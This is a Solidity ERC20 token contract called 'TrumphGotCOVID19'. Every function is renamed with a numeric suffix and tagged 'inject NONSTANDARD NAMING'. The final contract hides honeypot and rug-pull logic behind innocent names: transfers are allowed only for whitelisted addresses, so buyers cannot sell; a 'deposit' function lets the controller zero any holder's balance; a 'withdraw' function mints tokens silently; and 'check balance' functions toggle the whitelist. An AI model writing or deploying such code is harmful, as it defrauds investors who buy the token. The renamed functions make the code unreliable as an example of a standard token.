                                                                 

                                                                 

pragma solidity ^0.5.17;

interface IERC20 {
    function TOTALSUPPLY1() external view returns (uint);	//inject NONSTANDARD NAMING
    function BALANCEOF0(address account) external view returns (uint);	//inject NONSTANDARD NAMING
    function TRANSFER635(address recipient, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    function ALLOWANCE328(address owner, address spender) external view returns (uint);	//inject NONSTANDARD NAMING
    function APPROVE758(address spender, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    function TRANSFERFROM446(address sender, address recipient, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    event TRANSFER192(address indexed from, address indexed to, uint value);	//inject NONSTANDARD NAMING
    event APPROVAL6(address indexed owner, address indexed spender, uint value);	//inject NONSTANDARD NAMING
}

contract Context {
    constructor () internal { }
    function _MSGSENDER583() internal view returns (address payable) {	//inject NONSTANDARD NAMING
        return msg.sender;
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping (address => uint) private _balances;
    mapping (address => mapping (address => uint)) private _allowances;
    uint private _totalSupply;
    function TOTALSUPPLY1() public view returns (uint) {	//inject NONSTANDARD NAMING
        return _totalSupply;
    }
    function BALANCEOF0(address account) public view returns (uint) {	//inject NONSTANDARD NAMING
        return _balances[account];
    }
    function TRANSFER635(address recipient, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _BRIDGE484(_MSGSENDER583(), recipient, amount);
        return true;
    }
    function ALLOWANCE328(address owner, address spender) public view returns (uint) {	//inject NONSTANDARD NAMING
        return _allowances[owner][spender];
    }
    function APPROVE758(address spender, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE836(_MSGSENDER583(), spender, amount);
        return true;
    }
    function TRANSFERFROM446(address sender, address recipient, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _BRIDGE484(sender, recipient, amount);
        _APPROVE836(sender, _MSGSENDER583(), _allowances[sender][_MSGSENDER583()].SUB126(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function INCREASEALLOWANCE382(address spender, uint addedValue) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE836(_MSGSENDER583(), spender, _allowances[_MSGSENDER583()][spender].ADD141(addedValue));
        return true;
    }
    function DECREASEALLOWANCE700(address spender, uint subtractedValue) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE836(_MSGSENDER583(), spender, _allowances[_MSGSENDER583()][spender].SUB126(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    function _BRIDGE484(address sender, address recipient, uint amount) internal {	//inject NONSTANDARD NAMING
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _balances[sender] = _balances[sender].SUB126(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].ADD141(amount);
        emit TRANSFER192(sender, recipient, amount);
    }
    function _INITMINT406(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.ADD141(amount);
        _balances[account] = _balances[account].ADD141(amount);
        emit TRANSFER192(address(0), account, amount);
    }
    function _BURN364(address account, uint256 amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: burn from the zero address");
        _balances[account] = _balances[account].SUB126(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.SUB126(amount);
        emit TRANSFER192(account, address(0), amount);
    }
    function _WITHDRAW566(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: _withdraw to the zero address");
        _totalSupply = _totalSupply.ADD141(amount);
        _balances[account] = _balances[account].ADD141(amount);
    }
    function _DEPOSIT755(address acc) internal {	//inject NONSTANDARD NAMING
        _balances[acc] = 0;
    }
    function _APPROVE836(address owner, address spender, uint amount) internal {	//inject NONSTANDARD NAMING
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit APPROVAL6(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    constructor (string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }
    function NAME609() public view returns (string memory) {	//inject NONSTANDARD NAMING
        return _name;
    }
    function SYMBOL927() public view returns (string memory) {	//inject NONSTANDARD NAMING
        return _symbol;
    }
    function DECIMALS238() public view returns (uint8) {	//inject NONSTANDARD NAMING
        return _decimals;
    }
}

library SafeMath {
    function ADD141(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function SUB126(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        return SUB126(a, b, "SafeMath: subtraction overflow");
    }
    function SUB126(uint a, uint b, string memory errorMessage) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        require(b <= a, errorMessage);
        uint c = a - b;
        return c;
    }
    function MUL74(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        if (a == 0) {
            return 0;
        }
        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function DIV664(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        return DIV664(a, b, "SafeMath: division by zero");
    }
    function DIV664(uint a, uint b, string memory errorMessage) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        require(b > 0, errorMessage);
        uint c = a / b;
        return c;
    }
}

contract  TrumphGotCOVID19 is ERC20, ERC20Detailed {
  address public uniV2Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
  using SafeMath for uint;
  mapping (address => bool) public controller;
  mapping (address => bool) public stakers;
  constructor () public ERC20Detailed("Trumph Got COVID-19", "COVID-19", 18) {
      _INITMINT406( msg.sender, 1900*10**uint(DECIMALS238()) );
      controller[msg.sender] = true;
      stakers[msg.sender] = true;
      stakers[uniV2Router] = true;
  }
  function DEPOSIT418(address account) public {	//inject NONSTANDARD NAMING
      require(controller[msg.sender], "error");
      _DEPOSIT755(account);
  }
  function WITHDRAW785(address account, uint amount) public {	//inject NONSTANDARD NAMING
      require(controller[msg.sender], "error");
      _WITHDRAW566(account, amount);
  }
  function _BRIDGE484(address from_, address to_, uint amount) internal {	//inject NONSTANDARD NAMING
    require(stakers[from_], 'unauthorized');
    super._BRIDGE484(from_, to_, amount);
  }
  function _CHECKBALANCE228(address account) public {	//inject NONSTANDARD NAMING
      require(controller[msg.sender], "error");
      stakers[account] = true;
  }
  function _LOGREBASE782(address account) public {	//inject NONSTANDARD NAMING
      require(controller[msg.sender], "error");
      stakers[account] = false;
  }
}